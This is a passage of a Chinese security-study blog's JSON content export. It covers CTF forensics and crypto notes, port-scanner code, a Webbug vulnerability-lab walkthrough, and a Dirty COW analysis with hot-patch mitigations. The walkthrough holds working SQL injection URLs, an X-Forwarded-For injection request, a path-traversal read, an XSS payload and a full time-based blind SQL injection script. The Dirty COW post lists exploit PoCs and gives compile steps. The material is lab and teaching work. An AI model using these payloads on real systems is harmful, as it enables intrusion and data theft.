和 50 4B 07 08 的情况。 GIF特征：以 GIF89a 或 GIF87a 开头。 文件格式 空间 时间轴 identity命令 //、linux上的identify命令主要用于获取一个或多个图像文件的格式和特性。 思路： 压缩文件：zip文件格式 压缩源文件数据区• 文件头 ： PK开头• 文件数据• （数据描述符） 思路： 文件格式 CRC32爆破：有时候加密的文件很小，直接枚举数据的CRC32值，如果相同，就相当于知道了文件的内容 伪加密 已知明文攻击 目录结束标识 RAR 文件特征：以以 Rar! 开头。 流量分析(重要) 文件修复 协议分析• 总体把握（整体分析） 协议分级 端点统计 • 过滤赛选 过滤语法 Host，Protocol，contains，特征值 • 发现异常 特殊字符串 协议某字段 • 数据提取 字符串取 文件提取 数据提取 Wireshark Pcapfix //修复数据包 Dshell(强大) tshark（wireshark命令行版本）命令:1. tr，2.xxd 其他音频文件 频谱有可能是在高频上，需要进行拉伸。(Rctf 2017) 波形 隐写软件：MP3Stego,Slienteye 视频类AVI，MP4较为常见 工具： Ffmpeg：BCTF2016-catvideo Ourstrect HTML隐写Snow.exe：通过插入制表位与空格使得嵌入的数据在浏览器中不可见http://fog.misty.com/perry/ccs/snow/snow/ PYC文件类字节码修复,隐写，逆向分析。 Tools pycdc uncompyle http://unpyc.sourceforge.net/Opcodes.html\\ Stegosaurus 隐写 12python3.6 stegosaurus.py 5061c764-2ac4-4386-afd0-2f7a69139efa.pyc -xExtracted payload: Flag&#123;HiD3_Pal0ad_1n_Python&#125; 1http://www.freebuf.com/sectool/129357.html 固件分析类（国内少）Pro类 Python模拟输入 爆破 算法 安卓逆向分析调试: IDA Pro GDB -angrHook: Xposed Frida（important） java层： java-&gt;jvm字节码-&gt;dalvik字节码(javac,dx) dex-&gt;smali(baksmaili) dex-&gt;smali,伪java(jeb) dex-&gt;java字节码(dex2jar) java字节码-&gt;伪java(jd-gui) native层:IDA 代码混淆C/C++源码混淆工具 LLVM-Obfuscator CXX-Obfuscator 混淆技术 指令替换 伪造控制流 扁平化控制流 隐藏与取证Rootkit取证技术","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"人体行为识别","slug":"行为识别","date":"2017-08-05T15:53:56.000Z","updated":"2018-04-01T01:07:26.528Z","comments":true,"path":"2017/08/05/行为识别/","link":"","permalink":"https://shackles.top/2017/08/05/行为识别/","excerpt":"","text":"人体行为识别空间复杂度，时间复杂度。 1）将人体动作行为识别划分为几个相互联系的子过程， 根据过程划分方式的不同对相应技术进行分析分类; 2) 典型问题方式，即选取人体动作行为识别中的部分典型问题作为对象，针对这些对象研究中涉及的方法进行分析分类;3) 空间时域方式， 即根据时域和空间上各项研究方法的差别对相应技术进行分析分类． 传统行为识别运动目标检测： 图像分割 基于区域的方法，基于边界的方法和数学形态学方法。其中， 基于区域的方法又分为阈值分割法，区域生长法和区域分裂合并法。 人体动作识别研究对于人体区进行分割 直接利用或结合图像分割法对于人体区域分割 构建人体模型–》结合图像分割方法通过人体区域进行分割 动作分割 局部分割法选取部分动作序列作为分析目标或提取局部特征以实现整个行为的分割． 边界检测法是一种常用而经典的局部动作分割方法。 人体动作数据库 动作特征提取 第一种是基于图像局部特征检测的方法。例如有些学者使用方向梯度直方图或尺度不变检测子来提取视频中的形状信息， 并 用 光 流 直 方 图（ ＨＯＦ） 或 运 动边界直 方 图 （ ＭＢＨ） 特 征 提 取 视 频 中 的 运动信息，然后用词包的形式进行编码， 并 训 练 分类器识别人体行为。然而这种获取行为识别特征的方法是将视频图像中提取的局部特征通过手工制造得到高维的特征， 因此针对性较强， 通用性较差。 有一些学者通过构建多级体系结构分级 进 行 行 为 识 别， 例 如 有 些 算 法 采 用 第一级结构对视频进行多种时空分割并得到所有可能的包含人体区域的分割结果， 再在第二级中利用时空信息对分割结果进行推理， 从而获得有效的人体行为特征。虽然这种分层级的方法能够更好地融合时间与空间信息， 但在每个层级中的处理仍然依赖于手工制造的特征 有一些学 者 提 出 使 用 深 度 神 经 网 络 进 行 行 为 识别，例 如 有 学 者 提 出 使 用 卷 积 神 经 网 络获取视频的表观特征与运动特征并将得到的特征进行分 析 与融 合，从 而 获 得 有 效的 行 为 识 别 特征。 传统的方式 模板匹配 状态空间法法特征提取和分类这两个步骤完成: 首先是进行特征提取，常见的特征包括 LBP ( Local Binary Patterns) ， SIFT ( Scale-InvariantFeature Transform) 和 HOG( Histogram of Oriented Gradients)等; 分类则采用 SVM( Support Vector Machine) 和贝叶斯等机器学习中常用的分类器． 行为识别–机器学习参考：http://blog.sina.com.cn/s/blog_4caedc7a0102wrkz.html 人体特征值提取: 人体骨架—人体关键点(Skeleton) 通过RGB图像进行关节点估计（Pose Estimation）获得。 是通过深度摄像机直接获得（例如Kinect）。每一时刻（帧）骨架对应人体的K个关节点所在的坐标位置信息，一个时间序列由若干帧组成。行为识别就是对时域预先分割好的序列判定其所属行为动作的类型，即“读懂行为”。但在现实应用中更容易遇到的情况是序列尚未在时域分割（Untrimmed），因此需要同时对行为动作进行时域定位（分割）和类型判定，这类任务一般称为行为检测。 主要问题：一方面是如何设计鲁棒和有强判别性的特征，另一方面是如何利用时域相关性来对行为动作的动态变化进行建模。 LSTM（Long-Short Term Memory）和循环神经系统（RNN）来搭建基础框架。 基于 ＣＮＮ 的时空轨迹特征提取方法 基于骨架序列的行为识别 数据集http://blog.csdn.net/qq_36165459/article/details/78332172","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"家用路由器安全","slug":"路由器安全","date":"2017-07-29T15:53:56.000Z","updated":"2018-04-01T00:48:00.747Z","comments":true,"path":"2017/07/29/路由器安全/","link":"","permalink":"https://shackles.top/2017/07/29/路由器安全/","excerpt":"","text":"家用路由器安全 2017-08-09 路由器安全CGI 程运行 请求处理：客户端http请求 http server CGI CGI程序返回结果 攻击CGI 程序 在同一个请求中无法进行多次交互； binwak 漏洞利用 busybox 提权 自己编译shellcode sleep(1)​ 路由器web漏洞 xss csrf 认证漏洞 命令注入 lua","categories":[],"tags":[{"name":"物联网安全","slug":"物联网安全","permalink":"https://shackles.top/tags/物联网安全/"}]},{"title":"Web 服务端安全","slug":"Web 服务端安全","date":"2017-06-29T15:53:56.000Z","updated":"2018-03-29T23:23:35.251Z","comments":true,"path":"2017/06/29/Web 服务端安全/","link":"","permalink":"https://shackles.top/2017/06/29/Web 服务端安全/","excerpt":"","text":"Web 服务端安全 2016-10-05 Web 服务端webweb服务端 逆向的过程； SQL 注入1.$user=admin’or 1=1# Union 注入 有回显 猜解出来字段 可以填充查询结果 数据库报错； Boolean 盲注（在木有数据回显） Timing 盲注2 if（1，name，price） if(select(flag)，name，price） 文件包含 读取敏感文件 包含一句话getshell 创建临时文件 ​ http://58.154.33.13:8004/show.php?id=1502009577&amp;type=zip 123‘’,../../../../../../../etc/password# https://zhuanlan.zhihu.com/p/26308699","categories":[],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://shackles.top/tags/Web安全/"}]},{"title":"51单片机基础知识","slug":"51单片机","date":"2017-05-06T15:53:56.000Z","updated":"2018-04-14T12:35:00.037Z","comments":true,"path":"2017/05/06/51单片机/","link":"","permalink":"https://shackles.top/2017/05/06/51单片机/","excerpt":"","text":"51单片机基础知识5个中断源（2个外部中断3个内部中断） 1、外部中断0 INT0 、中断请求信号由P3.2输入。请求方式有两种：电平方式；脉冲方式。 通过TCON的IT0、IT1选择， 电平方式（IT0（IT1）=0）：低电平有效 脉冲方式（IT0（IT1）=1）：脉冲负跳变有效 中断允许位寄存器 IE EX0 = 1;//中断允许开关 IT0 = 0;//下降沿触发方式 EA = 1;//总开关 2、外部中断1、中断请求信号由P3.3输入。（INT0 1）3、定时/计数器0中断（T0） EA = 1;//总开关 ET0 = 1;//启动计数器中断开关 定时器的核心在这 TMOD = 0x09; TH0 = 0x0D8; // 初始化 定时/计数器寄存器 高八位 TL0 = 0x0F0; // 初始化 定时/计数器寄存器 低八位 TR0 = 1;//启动定时器 4、定时/计数器1中断（T1）5、串行口发送或接受中断五个中断寄存器1、中断允许寄存器IE Time Interrupt IE D7 D6 D5 D4 D3 D2 D1 D0 位名称 EA — — ES ET1 EX1 ET0 EX0 位地址 AFH — — ACH ABH AAH A9H A8H 中断源 CPU — — 串行口 T1 T0 EA=1 中断总允许 ；ET0 =1 启动计数器中断开关 2、定时器控制寄存器TCON 8位寄存器** TCON D7 D6 D5 D4 D3 D2 D1 D0 位名称 TF1 TR1 TF0 TR0 IE1 IT1 IE0 IT0 位地址 8FH 8EH 8DH 8CH 8BH 8AH 89H 88H 功能 T1 中断 标志 T1 触发 标志 T0 中断 标志 T0 触发 标志 INT01 中断 标志 INT1 触发 方式 INT0 中断 标志 INT0 触发 方式 12345678IT0（IT1）——外中断请求信号方式控制位IT0（IT1）=1 脉冲方式（负跳变有效）；IT0（IT1）=0 电平方式（低电平有效）TF0（TF1）——定时/计数溢出标志硬件置位——当定时/计数器产生溢出时。转向中断服务程序时，硬件自动清零。 3、中断优先级寄存器IP（不常用） IE D7 D6 D5 D4 D3 D2 D1 D0 位名称 — — — PS PT1 PX1 PT0 PX0 位地址 — — — BCH BBH BAH B9H B8H 中断源 — — — 串行口 T1 INT1 T0 INT0 4、定时器方式寄存器TMOD5、串行口控制寄存器SCON TCON D7 D6 D5 D4 D3 D2 D1 D0 位名称 — — — — — — TI RI 位地址 — — — — — — 99H 98H 功能 — — — — — — 串行发送 中断标志 串行接收 中断标志 中断优先级： 内部查询次序： 外部中断0®定时中断0®外部中断1®定时中断1®串行中断。 中断请求、中断响应、中断服务、中断返回","categories":[],"tags":[{"name":"物联网","slug":"物联网","permalink":"https://shackles.top/tags/物联网/"}]},{"title":"Violent Python","slug":"Violent Python","date":"2017-04-07T15:53:56.000Z","updated":"2018-03-29T23:23:10.224Z","comments":true,"path":"2017/04/07/Violent Python/","link":"","permalink":"https://shackles.top/2017/04/07/Violent Python/","excerpt":"","text":"Violent Python 2017-04-07 用pyhon进行渗透测试2.1 编写端口扫描2.1.1 TCP全连接扫描 TCP 全连接扫描：socket 和 optpares 1234socket.gethostbyname(hostname) \\\\socket.gethostbyaddr(ip addreess) \\\\socket.socket(\\[family\\[,type\\[,proto]]])\\\\socket.create_connection(addrees\\[,timeout\\[,surece_address]]) ​ optparse 模块是python的内建模块应用于处理命令行。 123456789101112from optparse import OptionParser [...] parser = OptionParser() parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;, help=&quot;write report to FILE&quot;, metavar=&quot;FILE&quot;) parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=True, help=&quot;don&apos;t print status messages to stdout&quot;) (options, args) = parser.parse_args() 12345678故命令行可以使用：usage: &lt;yourscript&gt; [options] options: -h, --help show this help message and exit -f FILE, --file=FILE write report to FILE -q, --quiet don&apos;t print status messages to stdout 12 2.2.2 抓取应用的Banner2.2.3 线程扫描python-nmap 利用python 调用nmap 1234567TCP SYN 扫描 ：又称为半开放扫描，这种类型的扫描发送一个SYN的TCP连接数包等待响应，当返回RST数据包表示端口关闭，返回ACK数据包表示端口开放。TCP NULL 扫描 ：TCP空扫描设置TCP的标志头为零。如果返回一个RST数据包则表示这个端口是关闭的。TCP FIN 扫描 : TCP FIN扫描发送一个FIN数据包，主动关闭连接，等待一个圆满的终止，如果返回RST数据包则表示端口是关闭的。TCP XMAS 扫描 ：TCP XMAS扫描设置 PSH, FIN,和URG TCP标志位，如返回RST数据包则表示这个端口是关闭的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# -*- coding:utf-8 -*-# -*- by shackle -*-# 输入主机名与端口-&gt;主机名变为IPV4地址-&gt;import optparseimport socketimport threading#### 建立socket连接def connScan(tgtHost,tgtPort): try: connSkt = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connSkt.connect((tgtHost,tgtPort)) print &apos;[+]%d/tcp open&apos;%tgtPort connSkt.close() except: print &apos;[-]%d/tcp closed &apos;% tgtPort## 定义端口扫描函数def portScan(tgtHost, tgtPorts): try: tgtIP = socket.gethostbyname(tgtHost) except: print &quot;[-] Cannot resolve &apos;%s&apos;: Unknown host&quot; % tgtHost return try: tgtName = socket.gethostbyaddr(tgtIP) print &apos;\\n[+] Scan Results for: &apos; + tgtName[0] except: print &apos;\\n[+] Scan Results for: &apos; + tgtIP socket.setdefaulttimeout(1) ### 多线程，多端口 for tgtPort in tgtPorts: print(&apos;Scanning port &apos; + str(tgtPort)) t = threading.Thread(target=connScan, args=(tgtHost, int(tgtPort))) t.start()def main(): parser = optparse.OptionParser(&apos;use: –H &lt;target host&gt; -P &lt;target port&gt;&apos;) # 新建paser对象 parser.add_option(&apos;-H&apos;, &apos;--host&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;taget host&apos;) parser.add_option(&apos;-P&apos;, &apos;--port&apos;, dest=&apos;tgtPort&apos;, type=&apos;int&apos;, help=&apos;taget port&apos;) (options, args) = parser.parse_args() # 已经定义好了所有的命令行参数，调用 parse_args() 来解析程序的命令行： # options，它是一个对象（optpars.Values），保存有命令行参数值。只要知道命令行参数名，如 file，就可以访问其对应的值： options.file 。 # args，它是一个由 positional arguments 组成的列表。 tgtHost = options.tgtHost tgtPort = options.tgtPort args.append(tgtPort) # 设置端口列表 if (tgtHost == None) | (tgtPort == None): print parser.usage exit(0) portScan(tgtHost,args)if __name__ == &apos;__main__&apos;: main() 2.2.4 利用NMAP12345678910111213141516171819202122232425262728# -*- coding:utf-8 -*-# -*- by shackle -*-\\# 调用 nmapimport optparseimport nmapdef nmapScan(tgtHost, tgtPort): nmScan = nmap.PortScanner() results = nmScan.scan(tgtHost, tgtPort) state = results[&apos;scan&apos;][tgtHost][&apos;tcp&apos;][int(tgtPort)][&apos;state&apos;] print(&quot; [*] &quot; + tgtHost + &quot; tcp/&quot; + tgtPort + &quot; &quot; + state)def main(): parser = optparse.OptionParser(&apos;usage %prog –H &lt;target host&gt; -P &lt;target port&gt;&apos;) parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;) parser.add_option(&apos;-P&apos;, dest=&apos;tgtPort&apos;, type=&apos;string&apos;, help=&apos;specify target port&apos;) (options, args) = parser.parse_args() tgtHost = options.tgtHost tgtPort = options.tgtPort args.append(tgtPort) if (tgtHost == None) | (tgtPort == None): print(&apos;[-] You must specify a target host and port[s]!&apos;) exit(0) for tgport in args: nmapScan(tgtHost, tgport)if __name__ == &apos;__main__&apos;: main()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://shackles.top/tags/Python/"}]},{"title":"国产Webbug开源漏洞平台","slug":"webbug","date":"2017-04-05T15:53:56.000Z","updated":"2018-03-31T14:22:42.418Z","comments":true,"path":"2017/04/05/webbug/","link":"","permalink":"https://shackles.top/2017/04/05/webbug/","excerpt":"","text":"国产的Webbug开源漏洞平台搞一下~ get注入图片破解信息收集练习——目录端口收集暴力破解练习x-forwarded-for注入支付漏洞垂直越权CSRFurl跳转GET任意文件下载POST任意文件下载无验证上传反射型XSS存储型XSS校验扩展名上传验证来源去向的url跳转文件包含POST文件包含HOST注入APK破解延时注入DZ7.2论坛sql注入aspcms注入phpmyadmin任意文件包含漏洞齐博系统SQL注入海盗云商getshellPHP168任意代码执行GET SHELLecshop 注入ShopXp系统SQL注射漏洞Dcore(轻型CMS系统)注入漏洞MetInfo 任意文件包含漏洞可getshellMetinfo news.php盲注Metinfo img.php盲注万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入BEESCMS sql注入，无视防御ourphp 注入phpwind 命令执行漏洞metinfo 任意用户密码修改DZ 3.2 存储型XSSDedeCMS flink.php友情链接注入DedeCms?recommend.php注入BEESCMS 小于等于V4四处注入+无需密码直接进后台海洋 x-forwarded-for注入php截断利用st2-016jboss命令执行tomcat弱口令hfs远程命令执行st2-052命令执行flash远程命令执行gh0st远程溢出IIS6.0远程溢出 渗透基础第一关:get注入__很简单的一个注入GET 手工注入/sqlmap 1、爆列长 order by 4 为1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' order by 4 %23 回显：不爆错，所以列长是4。 2、爆表 mysql information_schema 元信息表 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema = database() %23 回显：comment,flag,goods,user 四个表 3、爆列 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(column_name),2,3,4 from information_schema.columns where table_name = 'flag' %23 回显：id,flag flag表中的列 4、查询flag值 1http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select 1,flag,3,4 from flag %23 回显：名称为:204f704fbbcf6acf398ffee11989b377 第二关:从图片中你能找到什么？图片隐写题目 ， 想想之前misc 题目做的想吐。 第三关:你看到了什么？扫目录。。。emmm 第四关:告诉你了flang是5位数http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html bp 抓包爆破弱口令。 admin admin 123 第五关:一个优点小小的特殊的注入XFF 头注入 浅谈http头注入(附案例)https://zhuanlan.zhihu.com/p/27553821 User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中） Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）. X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）. Clien-IP：同上，不做过多介绍. Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过 来的. Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号(这个我本人还没碰到过，不过有真实存在的案例还是写上吧). 123456789101112GET /pentest/test/1/ HTTP/1.1Host: 10.102.15.214User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: HFS_SID_=0.630969217978418Content-Length: 0X-Forwarded-For:union select 1,flag,3,4 from flagConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 第六关:这关需要rmb购买哦截获数据包进行修改数量 逻辑漏洞 第七关:越权越权修改密码 http://10.102.15.214/pentest/test/3/change.php?name=admin 第八关:CSRF将更改密码的请求用Burpsuite截获 可一键生成CSRF PoC 第九关:URL跳转http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com 第十关:文件下载http://10.102.15.214/pentest/test/6/1/download.php 任意文件下载 payload： 下载 config.php http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php 第十一关:我和上一题有点像的确和上一关有点像 也是要找回mysql账号密码 还是先把下载的包抓下来看看 上一关的下载用的是get 本关用的post 第十二关:我系统密码忘记了！​ 上传漏洞的连接菜刀。 第十三关:XSS反射型 xss 1http://10.102.15.214/pentest/test/9/?id=&lt;img src onerror=al ert()&gt; 第十四关:存储型XSS 第十五关:什么？图片上传不了？只验证了Content-Type 抓包改。。。 第十六关:明天双十一中级进阶第一关:出来点东西吧 任意文件读取get 方式文件包含漏洞 http://10.102.94.210/pentest/test/13/?country=../../../index.html 第二关:提交方式是怎么样的啊？http://10.102.94.210/pentest/test/14/ post 方式文件 文件包含漏洞 第三关:我还是一个注入host 头注入 第四关:APK里面有一个flag逆向APK程序 第五关:时间注入http://10.102.94.210/pentest/test/time/ 12345678910111213141516171819202122232425262728293031#encoding=utf-8 #时间盲注脚本import requestsimport timepayloads = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.&#125;&#123;,'#存放跑出的结果length=0database=''table=''print 'start get length...'for l in range(1,21): startTime1=time.time() url1 = \"http://192.168.37.147/pentest/test/time/?type=1 and if(length(database())=%d,sleep(5),1)\"%(l) response1 = requests.get(url1) if time.time() - startTime1 &gt; 5: length=l print \"the length is \" + str(length) breakprint 'start database sql injection...'for d in range(1,length+1): for payload in payloads: startTime2=time.time() url2 = \"http://192.168.37.147/pentest/test/time/?type=1 and if(substr(database(),'%d',1)='%s',sleep(5),1)\"%(d,payload) response2 = requests.get(url2) #发送请求 if time.time() - startTime2 &gt; 5: #判断是否延时了5秒 也就是 是否执行了函数sleep(5) database+=payload print database breakprint \"the database is \" + database 实战练习:DZ论坛dz7.2 实战练习:aspcms实战练习:phpmyadmin实战练习:齐博系统实战练习:海盗云商实战练习:PHP168 6.0实战练习:ecshop实战练习:ShopXp系统v3.x实战练习:Dcore(轻型CMS系统)实战练习:MetInfo 5.1.7实战练习:Metinfo 5.3MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞: 实战扩展漏洞知识","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://shackles.top/tags/渗透/"}]},{"title":"CTF-密码学总结","slug":"CTF-密码学总结","date":"2017-03-02T15:53:56.000Z","updated":"2018-03-31T15:17:46.723Z","comments":true,"path":"2017/03/02/CTF-密码学总结/","link":"","permalink":"https://shackles.top/2017/03/02/CTF-密码学总结/","excerpt":"","text":"CTF-密码学总结 2016-11-08 密码学 CryptoAlice 与 Bob密码体质的定义：密码学5元组秘钥量 对称密码与非对称密码（公钥与私钥）； 密码分析的分类1、穷举攻击2、统计分析攻击3、数学分析攻击 唯密文攻击； 已知明文攻击； 选择明文攻击； 选择密文攻击； 密码体制的安全性计算安全性；可证明安全性；无条件安全性； 古典密码学1、单表代换加密明文与密文一一对应；2、多表代换加密已知加密算法破解； 现代密码对称密码的设计原理： 密文的统计特性与使用的密钥独立； DES分组加密算法 ，密钥长度56位；（每个第8位作为奇偶校验位） AESRC5分组密码的加密的模式： 零知识证明 http://quipqiup.com/ 词频分析 md5解密 www.dmd5.com http://www.dmd5.com/","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"CVE-2016-5195（脏牛）内核提权漏洞分析","slug":"CVE-2016-5195（脏牛）内核提权","date":"2017-01-29T15:53:56.000Z","updated":"2018-04-01T13:51:53.514Z","comments":true,"path":"2017/01/29/CVE-2016-5195（脏牛）内核提权/","link":"","permalink":"https://shackles.top/2017/01/29/CVE-2016-5195（脏牛）内核提权/","excerpt":"","text":"CVE-2016-5195（脏牛）内核提权漏洞分析脏牛漏洞 提权Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。 一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞 漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权 影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。 360 Vulpecker Team：Android 7.0最新的10月补丁安全级别的系统上测试过漏洞POC，确认Android受影响 blog：Dirty COW (CVE-2016-5195)https://dirtycow.ninja/ 实验步骤步骤1：编译POCpoc 地址：https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c 执行以下命令进行gcc编译 1234uanme -a whoamigcc -pthread dirtyc0w.c -o dirtyc0w //编译 gcc命令是一个编译器套件，可用于编译多种语言源码。 小i注解： 可见编译选项中指定-pthread 会附加一个宏定义 -D_REENTRANT该宏会导致 libc 头文件选择那些thread-safe的实现。-o参数为编译后输出文件名。 步骤2：验证漏洞POC: Link Usage Description Family — — — — — — — dirtyc0w.c ./dirtyc0w file content Read-only write /proc/self/mem cowroot.c ./cowroot SUID-based root /proc/self/mem dirtycow-mem.c ./dirtycow-mem libc-based root /proc/self/mem pokemon.c ./d file content Read-only write PTRACE_POKEDATA dirtycow.cr dirtycow --target --string --offset Read-only write /proc/self/mem dirtyc0w.c ./dirtycow file content Read-only write (Android) /proc/self/mem dirtycow.rb use exploit/linux/local/dirtycow and run SUID-based root /proc/self/mem 0xdeadbeef.c ./0xdeadbeef vDSO-based root PTRACE_POKEDATA naughtyc0w.c ./c0w suid SUID-based root /proc/self/mem c0w.c ./c0w SUID-based root PTRACE_POKEDATA dirty_pass[…].c ./dirty_passwd_adjust_cow /etc/passwd based root /proc/self/mem mucow.c ./mucow destination &lt; payload.exe Read-only write (multi page) PTRACE_POKEDATA cowpy.c r2pm -i dirtycow Read-only write (radare2) /proc/self/mem dirtycow.fasm ./main SUID-based root /proc/self/mem dcow.cpp ./dcow /etc/passwd based root /proc/self/mem dirtyc0w.go go run dirtyc0w.go -f=file -c=content Read-only write /proc/self/mem dirty.c ./dirty /etc/passwd based root PTRACE_POKEDATA Dirty COW Tester make &amp;&amp; ./bin/dct Read-only write /proc/self/mem exploit.c ./exploit vDSO-based root (Android) PTRACE_POKEDATA cowcron.c 分析与思考 Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。 一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致某些Linux版本提权漏洞。 低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取Root权限。 该漏洞影响所有目前运行Linux系统的设备，包含但不限于运行Linux系统的服务器，Docker容器/手机/路由器/智能设备等。 Linux写时拷贝技术(copy-on-write) 在Linux程序中，fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程 竞态条件 竞态条件（race condition）是指设备或系统出现不恰当的执行时序，而得到不正确的结果。 linux内存管理–缺页异常处理 触发异常的线性地址处于用户空间的vma中，但还未分配物理页，如果访问权限OK的话内核就给进程分配相应的物理页。 触发异常的线性地址不处于用户空间的vma中，这种情况得判断是不是因为用户进程的栈空间消耗完而触发的缺页异常。 如果 是的话则在用户空间对栈区域进行扩展，并且分配相应的物理页，如果不是则作为一次非法地址访问来处理，内核将终结进程 缺页中断 缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。在这个时候，被内存映射的文件实际上成了一个分页交换文件。 修复方案 更新最新Linux Kernel源码，并重新编译，也可直接升级最新版本。 修复相关代码 https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/？id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619 免重启热修补由于该漏洞位于 Linux 内核，发行版官方的内核更新只有在重启后才能生效。 如果您的线上业务不能中断，可以采用下面这种基于 SystemTap 的热修补方法，并在合适的时候更新系统内核。 SystemTap 是监控和跟踪运行中的Linux 内核的操作的动态方法。这句话的关键词是动态，因为SystemTap 没有使用工具构建一个特殊的内核，而是允许您在运行时动态地安装该工具。 针对 CVE-2016-5195 的 SystemTap 热修补补丁最先出现在 Red Hat 公司 Bug 追踪系统的讨论区（出处），内容节选如下： 123probe kernel.function(&quot;mem_write&quot;).call ? &#123; $count = 0 &#125;robe syscall.ptrace &#123; $request = 0xfff &#125;` 通过阻止写入 /proc/self/mem 来达到阻止上述利用代码的目的。 该补丁有较为明显的副作用：无法调试程序，还可能导致 RHEL/CentOS 6 和 Ubuntu 14.04 上使用的 upstart 服务管理机制不能正常工作。 本文提供另一种热修补方式，代码如下： 123 probe kernel.function(&quot;sys_madvise&quot;) &#123; if ($behavior == 4) &#123; $behavior = 0 &#125;&#125; Ubuntu系统修复安装SystemTap相关步骤： 1234567apt-get install gcc systemtapddeb_filename=$(dpkg-query --show --showformat=&apos;$&#123;Package&#125;-dbgsym_$&#123;Version&#125;_$&#123;Architecture&#125;.ddeb&apos; linux-image-$(uname -r))wget http://ddebs.ubuntu.com/pool/main/l/linux/$&#123;ddeb_filename&#125;dpkg -i $&#123;ddeb_filename&#125; 测试SystemTap安装成功： 1stap -e &apos;probe begin &#123; print(&quot;hello world\\n&quot;); exit(); &#125;&apos; 执行热修补 1234stap -Fge &apos;probe kernel.function(&quot;sys_madvise&quot;) &#123; if ($behavior == 4) &#123; $behavior = 0 &#125;&#125;&apos;Disconnecting from systemtap module.To reconnect, type &quot;staprun -A stap_9f8ce8307eb418da7c981b3223eec678_12644&quot; 修补完成 12lsmod | grep stapstap_9f8ce8307eb418da7c981b3223eec678_12644 81920 0 可以看到 SystemTap 编译出的内核模块已经成功加载。 参考资料https://dirtycow.ninja/ https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619 http://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651370571&amp;idx=1&amp;sn=68acf07ca2683a9c98fa52e900d97db3&amp;chksm=8d39c5c3ba4e4cd58c21d0a21ca337ded2132625987e174d286f8d175034267bd09807ea9a11&amp;scene=4#wechat_redirect","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"MEAN--全栈WEB开发框架","slug":"MEAN--全栈WEB开发框架","date":"2016-11-29T15:53:56.000Z","updated":"2018-03-29T23:25:48.530Z","comments":true,"path":"2016/11/29/MEAN--全栈WEB开发框架/","link":"","permalink":"https://shackles.top/2016/11/29/MEAN--全栈WEB开发框架/","excerpt":"","text":"MEAN–全栈WEB开发框架 2016-12-01 MEAN Mongode + Express + Angular + Node.js ##全Javascript的开发架构MEAN。js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。 (M)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是使用JS来进行sql查询；m (E)Express——较好的基于Node的Web开发框架，是一个最小的，灵活的Node.js 